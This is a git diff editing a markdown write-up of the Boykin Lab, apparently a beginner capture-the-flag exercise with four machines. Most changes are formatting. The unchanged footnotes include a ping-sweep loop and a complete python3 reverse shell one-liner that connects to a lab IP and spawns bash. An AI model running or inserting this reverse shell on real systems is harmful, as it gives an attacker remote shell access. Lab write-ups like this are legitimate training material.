@@ -1,12 +1,9 @@
 # Boykin Lab
 
-Start Point - 67.205.146.156
-
 Contents:
 
 1. TOC
 {:toc}
-
 <p>&nbsp;</p>
 =======================================================
 
@@ -15,7 +12,6 @@ Contents:
 =======================================================
 
 The Boykin lab is something I lucked into thanks to VetSec Slack, where I met the designer and maintainer of the lab, CaptBoykin. It is intended as a basic-level challenge, featuring four separate machines, each with flags for the attacker to capture.  Two pieces of information are provided at the start:  An initial public IP address and a hint that the final flag involves taking a capture of a webcam aimed at the flag.  Everything between those two is up to you, and there are multiple paths to and through most of the machines.
-
 <p>&nbsp;</p>
 =======================================================
 
@@ -885,7 +881,7 @@ As of mid-September 2020, this concludes the lab.  But wait, what happened to 10
 
 =======================================================
 
--1- bash script for ping scan:  for i in $(seq 1 254); do (ping -c 1 10.136.0.${i} | grep "bytes from" &); done;
+-1- bash script for ping scan:  for i in $(seq 1 254); do (ping -c 1 10.136.0.${i} \| grep "bytes from" &); done;
 
 -2- python3 reverse shell:  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.136.0.2\",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'
 
@@ -901,7 +897,6 @@ As of mid-September 2020, this concludes the lab.  But wait, what happened to 10
 3. SaltStack: [https://docs.saltstack.com/en/getstarted/system/communication.html](https://docs.saltstack.com/en/getstarted/system/communication.html)
 4. id_rsa brute force: [https://github.com/readonlymaio/mm_id_rsa_bruteforce](https://github.com/readonlymaio/mm_id_rsa_bruteforce)
 5. tcpdump tutorial: [https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/](https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/)
-6. Link: []()
 
 <p>&nbsp;</p>
 =======================================================
